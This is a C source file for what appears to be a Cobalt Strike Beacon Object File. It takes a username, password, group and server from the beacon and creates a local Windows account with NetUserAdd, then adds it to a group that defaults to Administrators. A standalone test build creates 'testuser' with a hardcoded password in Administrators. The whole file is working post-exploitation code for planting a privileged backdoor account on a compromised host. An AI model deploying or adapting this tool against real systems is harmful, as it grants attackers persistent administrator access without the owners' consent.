#include <windows.h>
#include <iphlpapi.h>
#include <stdint.h>
#include <stdlib.h>
#include "lmaccess.h"
#include "lmerr.h"
#include "lm.h"
#include "bofdefs.h"
#include "base.c"


void netuseradd(wchar_t* username, wchar_t* password, const wchar_t * groupname, const wchar_t * servername) {
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 lgmi;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
    NET_API_STATUS nStatus;
    
    ui.usri1_name = username;  
	ui.usri1_password = password;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;
    
    nStatus = NETAPI32$NetUserAdd(servername, dwLevel, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success)
    {
        internal_printf("User %ls has been successfully added\n", username);
    }
    else if(nStatus == NERR_UserExists) {
        internal_printf("The user account already exists.\n", 0);
    }
    else
    {   
        internal_printf("A system error has occurred: %d\n", nStatus);
        return;
    }


    lgmi.lgrmi3_domainandname = username;
    nStatus = NETAPI32$NetLocalGroupAddMembers(
        servername, 
        groupname, 
        3, 
        (LPBYTE)&lgmi, 
        1);
    
    if (nStatus == NERR_Success)
    {
        internal_printf("User %ls has been successfully added to %ls\n", username, groupname);
    }
    else
    {
        internal_printf("A system error has occurred: %d\n", nStatus);
    }

}

#ifdef BOF

VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    wchar_t defaultGroupName[15] = L"Administrators";

    datap parser;
    wchar_t *username = NULL;
    wchar_t *password = NULL;
    wchar_t *groupname = NULL;
    wchar_t *servername = NULL;
	if(!bofstart())
	{
		return;
	}
    BeaconDataParse(&parser, Buffer, Length);
    username = (wchar_t *)BeaconDataExtract(&parser, NULL);
    password = (wchar_t *)BeaconDataExtract(&parser, NULL);
    groupname = (wchar_t *)BeaconDataExtract(&parser, NULL);
    servername = (wchar_t *)BeaconDataExtract(&parser, NULL);
    groupname = *groupname == 0 ? defaultGroupName : groupname;
    servername = *servername == 0 ? NULL : servername;
    netuseradd(username, password, groupname, servername);

	printoutput(TRUE);
};

#else

int main()
{
netuseradd(L"testuser", L"testP@ssword", L"Administrators", NULL);
return 0;
}

#endif
